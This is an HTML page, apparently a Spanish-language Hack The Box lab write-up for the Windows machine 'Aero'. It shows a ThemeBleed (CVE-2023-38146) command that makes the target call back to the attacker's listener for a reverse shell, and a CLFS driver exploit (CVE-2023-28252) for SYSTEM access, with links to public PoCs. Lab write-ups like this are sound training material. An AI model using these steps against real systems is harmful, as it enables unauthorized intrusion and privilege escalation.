@@ -1,0 +1,82 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Aero HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/windows.html">~/writeups/windows</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/aero/pasted-20260307235848.png" alt="Aero HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Windows</p>
+          <h1>Aero</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>driver</span>
+            <span>clfs</span>
+            <span>windows_theme</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Aplicación web que permite subir temas de Windows 11</li>
+            <li><code>Explotación</code>: Subida de un <code>evil.theme</code> para obtener ejecución en el sistema</li>
+            <li><code>Escalada de Privilegios</code>: Driver vulnerable permite escalar privilegios en Windows</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/aero/pasted-20260308010130.png" alt="Aero HTB" />
+          <img class="writeup-image" src="/writeups/assets/aero/pasted-20260308010146.png" alt="Aero HTB" />
+          <img class="writeup-image" src="/writeups/assets/aero/pasted-20260308010159.png" alt="Aero HTB" />
+          <img class="writeup-image" src="/writeups/assets/aero/pasted-20260308010252.png" alt="Aero HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: Windows 11 Themes</h2>
+          <p><a href="https://github.com/Jnnshschl/CVE-2023-38146">PoC GitHub</a></p>
+          <div class="code-card">
+            <h3>PoC</h3>
+            <pre><code># Buscamos en Google: Windows 11 theme vulnerabilities
+# Lanzamos el script mientras nos ponemos en escucha y subimo e evil-theme creado a la web
+python3 themebleed.py -r 10.10.16.69 -p 4711
+penelope -p 4711
+# Subir evil.theme
+# Obtenemos shell</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/aero/pasted-20260308010600.png" alt="Aero HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: Driver CLFS vulnerable</h2>
+          <div class="code-card">
+            <h3>Carpeta Documents</h3>
+            <pre><code># PDF: Indica vulnerabilidad del driver clfs con CVE-2023-28252</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/aero/pasted-20260308005910.png" alt="Aero HTB" />
+          <p><a href="https://github.com/bkstephen/Compiled-PoC-Binary-For-CVE-2023-28252">PoC GitHub</a></p>
+          <div class="code-card">
+            <h3>PoC</h3>
+            <pre><code>clfs_eop.exe cmd</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/aero/pasted-20260308010051.png" alt="Aero HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>driver</span>
+            <span>clfs</span>
+            <span>windows_theme</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
